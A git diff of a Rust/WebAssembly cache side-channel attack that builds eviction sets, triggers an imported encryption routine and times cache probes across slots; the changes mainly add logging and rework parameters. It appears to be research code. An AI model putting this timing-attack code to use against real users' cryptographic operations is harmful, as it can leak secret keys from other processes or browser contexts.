@@ -1,11 +1,14 @@
-use std::collections::LinkedList;
+mod config;
 
-use wasm_bindgen::{prelude::wasm_bindgen, JsValue};
+use std::collections::LinkedList;
+use wasm_bindgen::{prelude::wasm_bindgen, JsValue, convert::IntoWasmAbi};
+use web_sys::console::{log_1, log_2};
+use crate::config::Config;
 
 const CACHE_LINE_SIZE : usize = 64;
 const CACHE_ASSOCIATIVITY : usize = 12;
 
-#[wasm_bindgen]
+#[wasm_bindgen(module = "/js-to-rust.js")]
 extern "C" {
     fn getTime() -> u32;
     fn encrypt();
@@ -49,7 +52,6 @@ fn generate_conflict_set(eviction_sets: &Vec<LinkedList<u32>>) -> LinkedList<u32
         .flatten()
         .cloned()
         .collect()
-
 }
 
 fn generate_eviction_set(target: &[u8], probe: u32, candidate_set: &LinkedList<u32>, threshold: u32) -> LinkedList<u32> {
@@ -69,7 +71,6 @@ fn generate_eviction_set(target: &[u8], probe: u32, candidate_set: &LinkedList<u
 }
 
 fn generate_candidate_set(target: &[u8]) -> LinkedList<u32> {
-    let candidate_set : LinkedList<u32> = LinkedList::new();
     let number_of_candidates = target.len() / CACHE_LINE_SIZE;
     let mut candidates : Vec<usize> = (0..number_of_candidates).collect();
     (0..number_of_candidates)
@@ -82,25 +83,29 @@ fn generate_candidate_set(target: &[u8]) -> LinkedList<u32> {
         .collect()
 }
 
-
-
 #[wasm_bindgen]
-pub extern "C" fn flush_reload(target: &[u8], threshold: u32, wait_cycles: u32, time_slots: u32, time_slot_size: u32, probes: &[u32]) -> Box<[JsValue]> {
-    let candidate_set : LinkedList<u32> = generate_candidate_set(target);
-    let eviction_sets : Vec<LinkedList<u32>> = probes
+pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32, time_slot_size: u32, probes: &[u32], target: &[u8]) -> Box<[u32]> {
+    log_2(&"time_slots:".into(), &JsValue::from_f64(time_slots as f64));
+    log_2(&"threshold:".into(), &JsValue::from_f64(threshold as f64));
+    log_2(&"wait_cycles:".into(), &JsValue::from_f64(wait_cycles as f64));
+    log_2(&"time_slot_size:".into(), &JsValue::from_f64(time_slot_size as f64));
+    log_1(&format!("probe: {:?}", probes.iter().cloned().collect::<Vec<u32>>()).into());
+    log_1(&format!("probe: {:?}", target.len()).into());
+    let candidate_set : LinkedList<u32> = generate_candidate_set(target.as_ref());
+    let eviction_sets : Vec<LinkedList<u32>> = probes //config.probes
         .iter()
-        .map(|offset| generate_eviction_set(target, *offset, &candidate_set, threshold))
+        .map(|offset| generate_eviction_set(target.as_ref(), *offset, &candidate_set, threshold))
         .collect();
     let conflict_set : LinkedList<u32> = generate_conflict_set(&eviction_sets);
     encrypt();
-    let results : Vec<JsValue> = (0..time_slots)
+    let results : Vec<u32> = (0..time_slots)
         .flat_map(|_| {
             let start = getTime();
-            let time_slot_results : Vec<JsValue> = probes
+            let time_slot_results : Vec<u32> = probes
                 .iter()
-                .map(|p| JsValue::from_f64(probe(target, *p) as f64))
+                .map(|p| probe(target.as_ref(), *p))
                 .collect();
-            evict(target, &conflict_set);
+            evict(target.as_ref(), &conflict_set);
             while getTime() - start < time_slot_size {
                 wait(wait_cycles);
             }
